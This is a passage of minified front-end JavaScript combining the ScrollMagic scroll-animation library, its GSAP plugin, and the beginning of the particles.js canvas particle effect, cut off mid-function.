            var i = {
                pushFollowers: !0,
                spacerClass: "scrollmagic-pin-spacer"
            };
            if (e = n.extend({},
            i, e), !(t = n.get.elements(t)[0])) return g(1, "ERROR calling method 'setPin()': Invalid pin element supplied."),
            l;
            if ("fixed" === n.css(t, "position")) return g(1, "ERROR calling method 'setPin()': Pin does not work with elements that are positioned 'fixed'."),
            l;
            if (S) {
                if (S === t) return l;
                l.removePin()
            }
            S = t;
            var r = S.parentNode.style.display,
            s = ["top", "left", "bottom", "right", "margin", "marginLeft", "marginRight", "marginTop", "marginBottom"];
            S.parentNode.style.display = "none";
            var a = "absolute" != n.css(S, "position"),
            o = n.css(S, s.concat(["display"])),
            h = n.css(S, ["width", "height"]);
            S.parentNode.style.display = r,
            !a && e.pushFollowers && (g(2, "WARNING: If the pinned element is positioned absolutely pushFollowers will be disabled."), e.pushFollowers = !1),
            window.setTimeout(function() {
                S && 0 === c.duration && e.pushFollowers && g(2, "WARNING: pushFollowers =", !0, "has no effect, when scene duration is 0.")
            },
            0);
            var u = S.parentNode.insertBefore(document.createElement("div"), S),
            d = n.extend(o, {
                position: a ? "relative": "absolute",
                boxSizing: "content-box",
                mozBoxSizing: "content-box",
                webkitBoxSizing: "content-box"
            });
            if (a || n.extend(d, n.css(S, ["width", "height"])), n.css(u, d), u.setAttribute("data-scrollmagic-pin-spacer", ""), n.addClass(u, e.spacerClass), C = {
                spacer: u,
                relSize: {
                    width: "%" === h.width.slice( - 1),
                    height: "%" === h.height.slice( - 1),
                    autoFullWidth: "auto" === h.width && a && n.isMarginCollapseType(o.display)
                },
                pushFollowers: e.pushFollowers,
                inFlow: a
            },
            !S.___origStyle) {
                S.___origStyle = {};
                var p = S.style;
                s.concat(["width", "height", "position", "boxSizing", "mozBoxSizing", "webkitBoxSizing"]).forEach(function(t) {
                    S.___origStyle[t] = p[t] || ""
                })
            }
            return C.relSize.width && n.css(u, {
                width: h.width
            }),
            C.relSize.height && n.css(u, {
                height: h.height
            }),
            u.appendChild(S),
            n.css(S, {
                position: a ? "relative": "absolute",
                margin: "auto",
                top: "auto",
                left: "auto",
                bottom: "auto",
                right: "auto"
            }),
            (C.relSize.width || C.relSize.autoFullWidth) && n.css(S, {
                boxSizing: "border-box",
                mozBoxSizing: "border-box",
                webkitBoxSizing: "border-box"
            }),
            window.addEventListener("scroll", A),
            window.addEventListener("resize", A),
            window.addEventListener("resize", O),
            S.addEventListener("mousewheel", M),
            S.addEventListener("DOMMouseScroll", M),
            g(3, "added pin"),
            P(),
            l
        },
        this.removePin = function(t) {
            if (S) {
                if ("DURING" === h && P(!0), t || !s) {
                    var e = C.spacer.firstChild;
                    if (e.hasAttribute("data-scrollmagic-pin-spacer")) {
                        var i = C.spacer.style,
                        r = ["margin", "marginLeft", "marginRight", "marginTop", "marginBottom"];
                        margins = {},
                        r.forEach(function(t) {
                            margins[t] = i[t] || ""
                        }),
                        n.css(e, margins)
                    }
                    C.spacer.parentNode.insertBefore(e, C.spacer),
                    C.spacer.parentNode.removeChild(C.spacer),
                    S.parentNode.hasAttribute("data-scrollmagic-pin-spacer") || (n.css(S, S.___origStyle), delete S.___origStyle)
                }
                window.removeEventListener("scroll", A),
                window.removeEventListener("resize", A),
                window.removeEventListener("resize", O),
                S.removeEventListener("mousewheel", M),
                S.removeEventListener("DOMMouseScroll", M),
                S = void 0,
                g(3, "removed pin (reset: " + (t ? "true": "false") + ")")
            }
            return l
        };
        var E, z = [];
        return l.on("destroy.internal",
        function(t) {
            l.removeClassToggle(t.reset)
        }),
        this.setClassToggle = function(t, e) {
            var i = n.get.elements(t);
            return 0 !== i.length && n.type.String(e) ? (z.length > 0 && l.removeClassToggle(), E = e, z = i, l.on("enter.internal_class leave.internal_class",
            function(t) {
                var e = "enter" === t.type ? n.addClass: n.removeClass;
                z.forEach(function(t, i) {
                    e(t, E)
                })
            }), l) : (g(1, "ERROR calling method 'setClassToggle()': Invalid " + (0 === i.length ? "element": "classes") + " supplied."), l)
        },
        this.removeClassToggle = function(t) {
            return t && z.forEach(function(t, e) {
                n.removeClass(t, E)
            }),
            l.off("start.internal_class end.internal_class"),
            E = void 0,
            z = [],
            l
        },
        function() {
            for (var t in c) o.hasOwnProperty(t) || (g(2, 'WARNING: Unknown option "' + t + '"'), delete c[t]);
            for (var e in o) k(e);
            x()
        } (),
        l
    };
    var i = {
        defaults: {
            duration: 0,
            offset: 0,
            triggerElement: void 0,
            triggerHook: .5,
            reverse: !0,
            loglevel: 2
        },
        validate: {
            offset: function(t) {
                if (t = parseFloat(t), !n.type.Number(t)) throw ['Invalid value for option "offset":', t];
                return t
            },
            triggerElement: function(t) {
                if (t = t || void 0) {
                    var e = n.get.elements(t)[0];
                    if (!e) throw ['Element defined in option "triggerElement" was not found:', t];
                    t = e
                }
                return t
            },
            triggerHook: function(t) {
                var e = {
                    onCenter: .5,
                    onEnter: 1,
                    onLeave: 0
                };
                if (n.type.Number(t)) t = Math.max(0, Math.min(parseFloat(t), 1));
                else {
                    if (! (t in e)) throw ['Invalid value for option "triggerHook": ', t];
                    t = e[t]
                }
                return t
            },
            reverse: function(t) {
                return !! t
            },
            loglevel: function(t) {
                if (t = parseInt(t), !n.type.Number(t) || t < 0 || t > 3) throw ['Invalid value for option "loglevel":', t];
                return t
            }
        },
        shifts: ["duration", "offset", "triggerHook"]
    };
    t.Scene.addOption = function(e, n, r, s) {
        e in i.defaults ? t._util.log(1, "[static] ScrollMagic.Scene -> Cannot add Scene option '" + e + "', because it already exists.") : (i.defaults[e] = n, i.validate[e] = r, s && i.shifts.push(e))
    },
    t.Scene.extend = function(e) {
        var i = this;
        t.Scene = function() {
            return i.apply(this, arguments),
            this.$super = n.extend({},
            this),
            e.apply(this, arguments) || this
        },
        n.extend(t.Scene, i),
        t.Scene.prototype = i.prototype,
        t.Scene.prototype.constructor = t.Scene
    },
    t.Event = function(t, e, i, n) {
        n = n || {};
        for (var r in n) this[r] = n[r];
        return this.type = t,
        this.target = this.currentTarget = i,
        this.namespace = e || "",
        this.timeStamp = this.timestamp = Date.now(),
        this
    };
    var n = t._util = function(t) {
        var e, i = {},
        n = function(t) {
            return parseFloat(t) || 0
        },
        r = function(e) {
            return e.currentStyle ? e.currentStyle: t.getComputedStyle(e)
        },
        s = function(e, i, s, a) {
            if ((i = i === document ? t: i) === t) a = !1;
            else if (!f.DomElement(i)) return 0;
            e = e.charAt(0).toUpperCase() + e.substr(1).toLowerCase();
            var o = (s ? i["offset" + e] || i["outer" + e] : i["client" + e] || i["inner" + e]) || 0;
            if (s && a) {
                var l = r(i);
                o += "Height" === e ? n(l.marginTop) + n(l.marginBottom) : n(l.marginLeft) + n(l.marginRight)
            }
            return o
        },
        a = function(t) {
            return t.replace(/^[^a-z]+([a-z])/g, "$1").replace(/-([a-z])/g,
            function(t) {
                return t[1].toUpperCase()
            })
        };
        i.extend = function(t) {
            for (t = t || {},
            e = 1; e < arguments.length; e++) if (arguments[e]) for (var i in arguments[e]) arguments[e].hasOwnProperty(i) && (t[i] = arguments[e][i]);
            return t
        },
        i.isMarginCollapseType = function(t) {
            return ["block", "flex", "list-item", "table", "-webkit-box"].indexOf(t) > -1
        };
        var o = 0,
        l = ["ms", "moz", "webkit", "o"],
        c = t.requestAnimationFrame,
        h = t.cancelAnimationFrame;
        for (e = 0; ! c && e < l.length; ++e) c = t[l[e] + "RequestAnimationFrame"],
        h = t[l[e] + "CancelAnimationFrame"] || t[l[e] + "CancelRequestAnimationFrame"];
        c || (c = function(e) {
            var i = (new Date).getTime(),
            n = Math.max(0, 16 - (i - o)),
            r = t.setTimeout(function() {
                e(i + n)
            },
            n);
            return o = i + n,
            r
        }),
        h || (h = function(e) {
            t.clearTimeout(e)
        }),
        i.rAF = c.bind(t),
        i.cAF = h.bind(t);
        var u = ["error", "warn", "log"],
        d = t.console || {};
        for (d.log = d.log ||
        function() {},
        e = 0; e < u.length; e++) {
            var p = u[e];
            d[p] || (d[p] = d.log)
        }
        i.log = function(t) { (t > u.length || t <= 0) && (t = u.length);
            var e = new Date,
            i = ("0" + e.getHours()).slice( - 2) + ":" + ("0" + e.getMinutes()).slice( - 2) + ":" + ("0" + e.getSeconds()).slice( - 2) + ":" + ("00" + e.getMilliseconds()).slice( - 3),
            n = u[t - 1],
            r = Array.prototype.splice.call(arguments, 1),
            s = Function.prototype.bind.call(d[n], d);
            r.unshift(i),
            s.apply(d, r)
        };
        var f = i.type = function(t) {
            return Object.prototype.toString.call(t).replace(/^\[object (.+)\]$/, "$1").toLowerCase()
        };
        f.String = function(t) {
            return "string" === f(t)
        },
        f.Function = function(t) {
            return "function" === f(t)
        },
        f.Array = function(t) {
            return Array.isArray(t)
        },
        f.Number = function(t) {
            return ! f.Array(t) && t - parseFloat(t) + 1 >= 0
        },
        f.DomElement = function(t) {
            return "object" == typeof HTMLElement ? t instanceof HTMLElement: t && "object" == typeof t && null !== t && 1 === t.nodeType && "string" == typeof t.nodeName
        };
        var m = i.get = {};
        return m.elements = function(e) {
            var i = [];
            if (f.String(e)) try {
                e = document.querySelectorAll(e)
            } catch(t) {
                return i
            }
            if ("nodelist" === f(e) || f.Array(e)) for (var n = 0,
            r = i.length = e.length; n < r; n++) {
                var s = e[n];
                i[n] = f.DomElement(s) ? s: m.elements(s)
            } else(f.DomElement(e) || e === document || e === t) && (i = [e]);
            return i
        },
        m.scrollTop = function(e) {
            return e && "number" == typeof e.scrollTop ? e.scrollTop: t.pageYOffset || 0
        },
        m.scrollLeft = function(e) {
            return e && "number" == typeof e.scrollLeft ? e.scrollLeft: t.pageXOffset || 0
        },
        m.width = function(t, e, i) {
            return s("width", t, e, i)
        },
        m.height = function(t, e, i) {
            return s("height", t, e, i)
        },
        m.offset = function(t, e) {
            var i = {
                top: 0,
                left: 0
            };
            if (t && t.getBoundingClientRect) {
                var n = t.getBoundingClientRect();
                i.top = n.top,
                i.left = n.left,
                e || (i.top += m.scrollTop(), i.left += m.scrollLeft())
            }
            return i
        },
        i.addClass = function(t, e) {
            e && (t.classList ? t.classList.add(e) : t.className += " " + e)
        },
        i.removeClass = function(t, e) {
            e && (t.classList ? t.classList.remove(e) : t.className = t.className.replace(new RegExp("(^|\\b)" + e.split(" ").join("|") + "(\\b|$)", "gi"), " "))
        },
        i.css = function(t, e) {
            if (f.String(e)) return r(t)[a(e)];
            if (f.Array(e)) {
                var i = {},
                n = r(t);
                return e.forEach(function(t, e) {
                    i[t] = n[a(t)]
                }),
                i
            }
            for (var s in e) {
                var o = e[s];
                o == parseFloat(o) && (o += "px"),
                t.style[a(s)] = o
            }
        },
        i
    } (window || {});
    return t.Scene.prototype.addIndicators = function() {
        return t._util.log(1, "(ScrollMagic.Scene) -> ERROR calling addIndicators() due to missing Plugin 'debug.addIndicators'. Please make sure to include plugins/debug.addIndicators.js"),
        this
    },
    t.Scene.prototype.removeIndicators = function() {
        return t._util.log(1, "(ScrollMagic.Scene) -> ERROR calling removeIndicators() due to missing Plugin 'debug.addIndicators'. Please make sure to include plugins/debug.addIndicators.js"),
        this
    },
    t.Scene.prototype.setTween = function() {
        return t._util.log(1, "(ScrollMagic.Scene) -> ERROR calling setTween() due to missing Plugin 'animation.gsap'. Please make sure to include plugins/animation.gsap.js"),
        this
    },
    t.Scene.prototype.removeTween = function() {
        return t._util.log(1, "(ScrollMagic.Scene) -> ERROR calling removeTween() due to missing Plugin 'animation.gsap'. Please make sure to include plugins/animation.gsap.js"),
        this
    },
    t.Scene.prototype.setVelocity = function() {
        return t._util.log(1, "(ScrollMagic.Scene) -> ERROR calling setVelocity() due to missing Plugin 'animation.velocity'. Please make sure to include plugins/animation.velocity.js"),
        this
    },
    t.Scene.prototype.removeVelocity = function() {
        return t._util.log(1, "(ScrollMagic.Scene) -> ERROR calling removeVelocity() due to missing Plugin 'animation.velocity'. Please make sure to include plugins/animation.velocity.js"),
        this
    },
    t
}),
function(t, e) {
    "function" == typeof define && define.amd ? define(["ScrollMagic", "TweenMax", "TimelineMax"], e) : "object" == typeof exports ? (require("gsap"), e(require("scrollmagic"), TweenMax, TimelineMax)) : e(t.ScrollMagic || t.jQuery && t.jQuery.ScrollMagic, t.TweenMax || t.TweenLite, t.TimelineMax || t.TimelineLite)
} (this,
function(t, e, i) {
    "use strict";
    var n = window.console || {},
    r = Function.prototype.bind.call(n.error || n.log ||
    function() {},
    n);
    t || r("(animation.gsap) -> ERROR: The ScrollMagic main module could not be found. Please make sure it's loaded before this plugin or use an asynchronous loader like requirejs."),
    e || r("(animation.gsap) -> ERROR: TweenLite or TweenMax could not be found. Please make sure GSAP is loaded before ScrollMagic or use an asynchronous loader like requirejs."),
    t.Scene.addOption("tweenChanges", !1,
    function(t) {
        return !! t
    }),
    t.Scene.extend(function() {
        var t, n = this,
        r = function() {
            n._log && (Array.prototype.splice.call(arguments, 1, 0, "(animation.gsap)", "->"), n._log.apply(this, arguments))
        };
        n.on("progress.plugin_gsap",
        function() {
            s()
        }),
        n.on("destroy.plugin_gsap",
        function(t) {
            n.removeTween(t.reset)
        });
        var s = function() {
            if (t) {
                var e = n.progress(),
                i = n.state();
                t.repeat && t.repeat() === -1 ? "DURING" === i && t.paused() ? t.play() : "DURING" === i || t.paused() || t.pause() : e != t.progress() && (0 === n.duration() ? e > 0 ? t.play() : t.reverse() : n.tweenChanges() && t.tweenTo ? t.tweenTo(e * t.duration()) : t.progress(e).pause())
            }
        };
        n.setTween = function(a, o, l) {
            var c;
            arguments.length > 1 && (arguments.length < 3 && (l = o, o = 1), a = e.to(a, o, l));
            try {
                c = i ? new i({
                    smoothChildTiming: !0
                }).add(a) : a,
                c.pause()
            } catch(t) {
                return r(1, "ERROR calling method 'setTween()': Supplied argument is not a valid TweenObject"),
                n
            }
            if (t && n.removeTween(), t = c, a.repeat && a.repeat() === -1 && (t.repeat( - 1), t.yoyo(a.yoyo())), n.tweenChanges() && !t.tweenTo && r(2, "WARNING: tweenChanges will only work if the TimelineMax object is available for ScrollMagic."), t && n.controller() && n.triggerElement() && n.loglevel() >= 2) {
                var h = e.getTweensOf(n.triggerElement()),
                u = n.controller().info("vertical");
                h.forEach(function(t, e) {
                    var i = t.vars.css || t.vars;
                    if (u ? void 0 !== i.top || void 0 !== i.bottom: void 0 !== i.left || void 0 !== i.right) return r(2, "WARNING: Tweening the position of the trigger element affects the scene timing and should be avoided!"),
                    !1
                })
            }
            if (parseFloat(TweenLite.version) >= 1.14) for (var d, p, f = t.getChildren ? t.getChildren(!0, !0, !1) : [t], m = function() {
                r(2, "WARNING: tween was overwritten by another. To learn how to avoid this issue see here: https://github.com/janpaepke/ScrollMagic/wiki/WARNING:-tween-was-overwritten-by-another")
            },
            g = 0; g < f.length; g++) d = f[g],
            p !== m && (p = d.vars.onOverwrite, d.vars.onOverwrite = function() {
                p && p.apply(this, arguments),
                m.apply(this, arguments)
            });
            return r(3, "added tween"),
            s(),
            n
        },
        n.removeTween = function(e) {
            return t && (e && t.progress(0).pause(), t.kill(), t = void 0, r(3, "removed tween (reset: " + (e ? "true": "false") + ")")),
            n
        }
    })
});
var pJS = function(t, e) {
    var i = document.querySelector("#" + t + " > .particles-js-canvas-el");
    this.pJS = {
        canvas: {
            el: i,
            w: i.offsetWidth,
            h: i.offsetHeight
        },
        particles: {
            number: {
                value: 400,
                density: {
                    enable: !0,
                    value_area: 800
                }
            },
            color: {
                value: "#fff"
            },
            shape: {
                type: "circle",
                stroke: {
                    width: 0,
                    color: "#ff0000"
                },
                polygon: {
                    nb_sides: 5
                },
                image: {
                    src: "",
                    width: 100,
                    height: 100
                }
            },
            opacity: {
                value: 1,
                random: !1,
                anim: {
                    enable: !1,
                    speed: 2,
                    opacity_min: 0,
                    sync: !1
                }
            },
            size: {
                value: 20,
                random: !1,
                anim: {
                    enable: !1,
                    speed: 20,
                    size_min: 0,
                    sync: !1
                }
            },
            line_linked: {
                enable: !0,
                distance: 100,
                color: "#fff",
                opacity: 1,
                width: 1
            },
            move: {
                enable: !0,
                speed: 2,
                direction: "none",
                random: !1,
                straight: !1,
                out_mode: "out",
                bounce: !1,
                attract: {
                    enable: !1,
                    rotateX: 3e3,
                    rotateY: 3e3
                }
            },
            array: []
        },
        interactivity: {
            detect_on: "canvas",
            events: {
                onhover: {
                    enable: !0,
                    mode: "grab"
                },
                onclick: {
                    enable: !0,
                    mode: "push"
                },
                resize: !0
            },
            modes: {
                grab: {
                    distance: 100,
                    line_linked: {
                        opacity: 1
                    }
                },
                bubble: {
                    distance: 200,
                    size: 80,
                    duration: .4
                },
                repulse: {
                    distance: 200,
                    duration: .4
                },
                push: {
                    particles_nb: 4
                },
                remove: {
                    particles_nb: 2
                }
            },
            mouse: {}
        },
        retina_detect: !1,
        fn: {
            interact: {},
            modes: {},
            vendors: {}
        },
        tmp: {}
    };
    var n = this.pJS;
    e && Object.deepExtend(n, e),
    n.tmp.obj = {
        size_value: n.particles.size.value,
        size_anim_speed: n.particles.size.anim.speed,
        move_speed: n.particles.move.speed,
        line_linked_distance: n.particles.line_linked.distance,
        line_linked_width: n.particles.line_linked.width,
        mode_grab_distance: n.interactivity.modes.grab.distance,
        mode_bubble_distance: n.interactivity.modes.bubble.distance,
        mode_bubble_size: n.interactivity.modes.bubble.size,
        mode_repulse_distance: n.interactivity.modes.repulse.distance
    },
    n.fn.retinaInit = function() {
        n.retina_detect && window.devicePixelRatio > 1 ? (n.canvas.pxratio = window.devicePixelRatio, n.tmp.retina = !0) : (n.canvas.pxratio = 1, n.tmp.retina = !1),
        n.canvas.w = n.canvas.el.offsetWidth * n.canvas.pxratio,
        n.canvas.h = n.canvas.el.offsetHeight * n.canvas.pxratio,
        n.particles.size.value = n.tmp.obj.size_value * n.canvas.pxratio,
        n.particles.size.anim.speed = n.tmp.obj.size_anim_speed * n.canvas.pxratio,
        n.particles.move.speed = n.tmp.obj.move_speed * n.canvas.pxratio,
        n.particles.line_linked.distance = n.tmp.obj.line_linked_distance * n.canvas.pxratio,
        n.interactivity.modes.grab.distance = n.tmp.obj.mode_grab_distance * n.canvas.pxratio,
        n.interactivity.modes.bubble.distance = n.tmp.obj.mode_bubble_distance * n.canvas.pxratio,
        n.particles.line_linked.width = n.tmp.obj.line_linked_width * n.canvas.pxratio,
        n.interactivity.modes.bubble.size = n.tmp.obj.mode_bubble_size * n.canvas.pxratio,
        n.interactivity.modes.repulse.distance = n.tmp.obj.mode_repulse_distance * n.canvas.pxratio
    },
    n.fn.canvasInit = function() {
        n.canvas.ctx = n.canvas.el.getContext("2d")
    },
    n.fn.canvasSize = function() {
        n.canvas.el.width = n.canvas.w,
        n.canvas.el.height = n.canvas.h,
        n && n.interactivity.events.resize && window.addEventListener("resize",
        function() {
            n.canvas.w = n.canvas.el.offsetWidth,
            n.canvas.h = n.canvas.el.offsetHeight,
            n.tmp.retina && (n.canvas.w *= n.canvas.pxratio, n.canvas.h *= n.canvas.pxratio),
            n.canvas.el.width = n.canvas.w,
            n.canvas.el.height = n.canvas.h,
            n.particles.move.enable || (n.fn.particlesEmpty(), n.fn.particlesCreate(), n.fn.particlesDraw(), n.fn.vendors.densityAutoParticles()),
            n.fn.vendors.densityAutoParticles()
        })
    },
    n.fn.canvasPaint = function() {
        n.canvas.ctx.fillRect(0, 0, n.canvas.w, n.canvas.h)
    },
    n.fn.canvasClear = function() {
        n.canvas.ctx.clearRect(0, 0, n.canvas.w, n.canvas.h)
    },
    n.fn.particle = function(t, e, i) {
        if (this.radius = (n.particles.size.random ? Math.random() : 1) * n.particles.size.value, n.particles.size.anim.enable && (this.size_status = !1, this.vs = n.particles.size.anim.speed / 100, n.particles.size.anim.sync || (this.vs = this.vs * Math.random())), this.x = i ? i.x: Math.random() * n.canvas.w, this.y = i ? i.y: Math.random() * n.canvas.h, this.x > n.canvas.w - 2 * this.radius ? this.x = this.x - this.radius: this.x < 2 * this.radius && (this.x = this.x + this.radius), this.y > n.canvas.h - 2 * this.radius ? this.y = this.y - this.radius: this.y < 2 * this.radius && (this.y = this.y + this.radius), n.particles.move.bounce && n.fn.vendors.checkOverlap(this, i), this.color = {},
        "object" == typeof t.value) if (t.value instanceof Array) {
            var r = t.value[Math.floor(Math.random() * n.particles.color.value.length)];
            this.color.rgb = hexToRgb(r)
        } else void 0 != t.value.r && void 0 != t.value.g && void 0 != t.value.b && (this.color.rgb = {
            r: t.value.r,
            g: t.value.g,
            b: t.value.b
        }),
        void 0 != t.value.h && void 0 != t.value.s && void 0 != t.value.l && (this.color.hsl = {
            h: t.value.h,
            s: t.value.s,
            l: t.value.l
        });
        else "random" == t.value ? this.color.rgb = {
            r: Math.floor(256 * Math.random()) + 0,
            g: Math.floor(256 * Math.random()) + 0,
            b: Math.floor(256 * Math.random()) + 0
        }: "string" == typeof t.value && (this.color = t, this.color.rgb = hexToRgb(this.color.value));
        this.opacity = (n.particles.opacity.random ? Math.random() : 1) * n.particles.opacity.value,
        n.particles.opacity.anim.enable && (this.opacity_status = !1, this.vo = n.particles.opacity.anim.speed / 100, n.particles.opacity.anim.sync || (this.vo = this.vo * Math.random()));
        var s = {};
        switch (n.particles.move.direction) {
        case "top":
            s = {
                x: 0,
                y: -1
            };
            break;
        case "top-right":
            s = {
                x: .5,
                y: -.5
            };
            break;
        case "right":
            s = {
                x: 1,
                y: -0
            };
            break;
        case "bottom-right":
            s = {
                x: .5,
                y: .5
            };
            break;
        case "bottom":
            s = {
                x: 0,
                y: 1
            };
            break;
        case "bottom-left":
            s = {
                x: -.5,
                y: 1
            };
            break;
        case "left":
            s = {
                x: -1,
                y: 0
            };
            break;
        case "top-left":
            s = {
                x: -.5,
                y: -.5
            };
            break;
        default:
            s = {
                x: 0,
                y: 0
            }
        }
        n.particles.move.straight ? (this.vx = s.x, this.vy = s.y, n.particles.move.random && (this.vx = this.vx * Math.random(), this.vy = this.vy * Math.random())) : (this.vx = s.x + Math.random() - .5, this.vy = s.y + Math.random() - .5),
        this.vx_i = this.vx,
        this.vy_i = this.vy;
        var a = n.particles.shape.type;
        if ("object" == typeof a) {
            if (a instanceof Array) {
                var o = a[Math.floor(Math.random() * a.length)];
                this.shape = o
            }
        } else this.shape = a;
        if ("image" == this.shape) {
            var l = n.particles.shape;
            this.img = {
                src: l.image.src,
                ratio: l.image.width / l.image.height
            },
            this.img.ratio || (this.img.ratio = 1),
            "svg" == n.tmp.img_type && void 0 != n.tmp.source_svg && (n.fn.vendors.createSvgImg(this), n.tmp.pushing && (this.img.loaded = !1))
        }
    },
    n.fn.particle.prototype.draw = function() {
        var t = this;
        if (void 0 != t.radius_bubble) var e = t.radius_bubble;
        else var e = t.radius;
        if (void 0 != t.opacity_bubble) var i = t.opacity_bubble;
        else var i = t.opacity;
        if (t.color.rgb) var r = "rgba(" + t.color.rgb.r + "," + t.color.rgb.g + "," + t.color.rgb.b + "," + i + ")";
        else var r = "hsla(" + t.color.hsl.h + "," + t.color.hsl.s + "%," + t.color.hsl.l + "%," + i + ")";
        switch (n.canvas.ctx.fillStyle = r, n.canvas.ctx.beginPath(), t.shape) {
        case "circle":
            n.canvas.ctx.arc(t.x, t.y, e, 0, 2 * Math.PI, !1);
            break;
        case "edge":
            n.canvas.ctx.rect(t.x - e, t.y - e, 2 * e, 2 * e);
            break;
        case "triangle":
            n.fn.vendors.drawShape(n.canvas.ctx, t.x - e, t.y + e / 1.66, 2 * e, 3, 2);
            break;
        case "polygon":
            n.fn.vendors.drawShape(n.canvas.ctx, t.x - e / (n.particles.shape.polygon.nb_sides / 3.5), t.y - e / .76, 2.66 * e / (n.particles.shape.polygon.nb_sides / 3), n.particles.shape.polygon.nb_sides, 1);
            break;
        case "star":
            n.fn.vendors.drawShape(n.canvas.ctx, t.x - 2 * e / (n.particles.shape.polygon.nb_sides / 4), t.y - e / 1.52, 2 * e * 2.66 / (n.particles.shape.polygon.nb_sides / 3), n.particles.shape.polygon.nb_sides, 2);
            break;
        case "image":
            if ("svg" == n.tmp.img_type) var s = t.img.obj;
            else var s = n.tmp.img_obj;
            s &&
            function() {
                n.canvas.ctx.drawImage(s, t.x - e, t.y - e, 2 * e, 2 * e / t.img.ratio)
            } ()
        }
        n.canvas.ctx.closePath(),
        n.particles.shape.stroke.width > 0 && (n.canvas.ctx.strokeStyle = n.particles.shape.stroke.color, n.canvas.ctx.lineWidth = n.particles.shape.stroke.width, n.canvas.ctx.stroke()),
        n.canvas.ctx.fill()
    },
    n.fn.particlesCreate = function() {
        for (var t = 0; t < n.particles.number.value; t++) n.particles.array.push(new n.fn.particle(n.particles.color, n.particles.opacity.value))
    },
    n.fn.particlesUpdate = function() {
        for (var t = 0; t < n.particles.array.length; t++) {
            var e = n.particles.array[t];
            if (n.particles.move.enable) {
                var i = n.particles.move.speed / 2;
                e.x += e.vx * i,
                e.y += e.vy * i
            }
            if (n.particles.opacity.anim.enable && (1 == e.opacity_status ? (e.opacity >= n.particles.opacity.value && (e.opacity_status = !1), e.opacity += e.vo) : (e.opacity <= n.particles.opacity.anim.opacity_min && (e.opacity_status = !0), e.opacity -= e.vo), e.opacity < 0 && (e.opacity = 0)), n.particles.size.anim.enable && (1 == e.size_status ? (e.radius >= n.particles.size.value && (e.size_status = !1), e.radius += e.vs) : (e.radius <= n.particles.size.anim.size_min && (e.size_status = !0), e.radius -= e.vs), e.radius < 0 && (e.radius = 0)), "bounce" == n.particles.move.out_mode) var r = {
                x_left: e.radius,
                x_right: n.canvas.w,
                y_top: e.radius,
                y_bottom: n.canvas.h
            };
            else var r = {
                x_left: -e.radius,
                x_right: n.canvas.w + e.radius,
                y_top: -e.radius,
                y_bottom: n.canvas.h + e.radius
            };
            switch (e.x - e.radius > n.canvas.w ? (e.x = r.x_left, e.y = Math.random() * n.canvas.h) : e.x + e.radius < 0 && (e.x = r.x_right, e.y = Math.random() * n.canvas.h), e.y - e.radius > n.canvas.h ? (e.y = r.y_top, e.x = Math.random() * n.canvas.w) : e.y + e.radius < 0 && (e.y = r.y_bottom, e.x = Math.random() * n.canvas.w), n.particles.move.out_mode) {
            case "bounce":
                e.x + e.radius > n.canvas.w ? e.vx = -e.vx: e.x - e.radius < 0 && (e.vx = -e.vx),
                e.y + e.radius > n.canvas.h ? e.vy = -e.vy: e.y - e.radius < 0 && (e.vy = -e.vy)
            }
            if (isInArray("grab", n.interactivity.events.onhover.mode) && n.fn.modes.grabParticle(e), (isInArray("bubble", n.interactivity.events.onhover.mode) || isInArray("bubble", n.interactivity.events.onclick.mode)) && n.fn.modes.bubbleParticle(e), (isInArray("repulse", n.interactivity.events.onhover.mode) || isInArray("repulse", n.interactivity.events.onclick.mode)) && n.fn.modes.repulseParticle(e), n.particles.line_linked.enable || n.particles.move.attract.enable) for (var s = t + 1; s < n.particles.array.length; s++) {
                var a = n.particles.array[s];
                n.particles.line_linked.enable && n.fn.interact.linkParticles(e, a),
                n.particles.move.attract.enable && n.fn.interact.attractParticles(e, a),
                n.particles.move.bounce && n.fn.interact.bounceParticles(e, a)
            }
        }
    },
    n.fn.particlesDraw = function() {
        n.canvas.ctx.clearRect(0, 0, n.canvas.w, n.canvas.h),
        n.fn.particlesUpdate();
        for (var t = 0; t < n.particles.array.length; t++) {
            n.particles.array[t].draw()
        }
    },
    n.fn.particlesEmpty = function() {
        n.particles.array = []
    },
    n.fn.particlesRefresh = function() {
        cancelRequestAnimFrame(n.fn.checkAnimFrame),
        cancelRequestAnimFrame(n.fn.drawAnimFrame),
        n.tmp.source_svg = void 0,
        n.tmp.img_obj = void 0,
        n.tmp.count_svg = 0,
        n.fn.particlesEmpty(),
        n.fn.canvasClear(),
        n.fn.vendors.start()
    },
    n.fn.interact.linkParticles = function(t, e) {
        var i = t.x - e.x,
        r = t.y - e.y,
        s = Math.sqrt(i * i + r * r);
        if (s <= n.particles.line_linked.distance) {
            var a = n.particles.line_linked.opacity - s / (1 / n.particles.line_linked.opacity) / n.particles.line_linked.distance;
            if (a > 0) {
                var o = n.particles.line_linked.color_rgb_line;
                n.canvas.ctx.strokeStyle = "rgba(" + o.r + "," + o.g + "," + o.b + "," + a + ")",
                n.canvas.ctx.lineWidth = n.particles.line_linked.width,
                n.canvas.ctx.beginPath(),
                n.canvas.ctx.moveTo(t.x, t.y),
                n.canvas.ctx.lineTo(e.x, e.y),
                n.canvas.ctx.stroke(),
                n.canvas.ctx.closePath()
            }
        }
    },
    n.fn.interact.attractParticles = function(t, e) {
        var i = t.x - e.x,
        r = t.y - e.y;
        if (Math.sqrt(i * i + r * r) <= n.particles.line_linked.distance) {
            var s = i / (1e3 * n.particles.move.attract.rotateX),
            a = r / (1e3 * n.particles.move.attract.rotateY);
            t.vx -= s,
            t.vy -= a,
            e.vx += s,
            e.vy += a
        }
    },
    n.fn.interact.bounceParticles = function(t, e) {
        var i = t.x - e.x,
        n = t.y - e.y;
        Math.sqrt(i * i + n * n) <= t.radius + e.radius && (t.vx = -t.vx, t.vy = -t.vy, e.vx = -e.vx, e.vy = -e.vy)
    },
    n.fn.modes.pushParticles = function(t, e) {
        n.tmp.pushing = !0;
        for (var i = 0; i < t; i++) n.particles.array.push(new n.fn.particle(n.particles.color, n.particles.opacity.value, {
            x: e ? e.pos_x: Math.random() * n.canvas.w,
            y: e ? e.pos_y: Math.random() * n.canvas.h
        })),
        i == t - 1 && (n.particles.move.enable || n.fn.particlesDraw(), n.tmp.pushing = !1)
    },
    n.fn.modes.removeParticles = function(t) {
        n.particles.array.splice(0, t),
        n.particles.move.enable || n.fn.particlesDraw()
    },
    n.fn.modes.bubbleParticle = function(t) {
        function e() {
            t.opacity_bubble = t.opacity,
            t.radius_bubble = t.radius
        }
        function i(e, i, r, s, o) {
            if (e != i) if (n.tmp.bubble_duration_end) {
                if (void 0 != r) {
                    var l = s - u * (s - e) / n.interactivity.modes.bubble.duration,
